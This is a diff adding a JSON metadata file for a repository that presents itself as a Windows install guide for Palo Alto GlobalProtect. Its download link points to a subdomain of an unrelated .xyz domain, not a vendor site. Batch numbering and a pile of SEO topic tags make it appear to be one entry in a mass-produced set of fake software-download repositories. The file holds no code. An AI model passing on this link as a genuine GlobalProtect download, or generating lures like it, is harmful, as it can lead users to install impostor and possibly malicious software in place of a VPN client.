@@ -1,0 +1,25 @@
+{
+  "repo": "palo-alto-globalprotect-windows-manual",
+  "product": "Palo Alto GlobalProtect Windows Manual",
+  "kind": "guide",
+  "install_type": "download",
+  "download_url": "https://palo-alto-globalprotect.mefidirect.xyz/",
+  "batch": "new33",
+  "format": "license-md-only",
+  "category": "guide",
+  "topics": [
+    "palo-faq",
+    "palo-download-page",
+    "palo-alto-globalprotect-windows",
+    "install-palo-windows",
+    "palo-getting-started",
+    "palo-release",
+    "install-guide",
+    "release-notes",
+    "support-notes",
+    "windows",
+    "windows-11",
+    "windows-10",
+    "desktop"
+  ]
+}
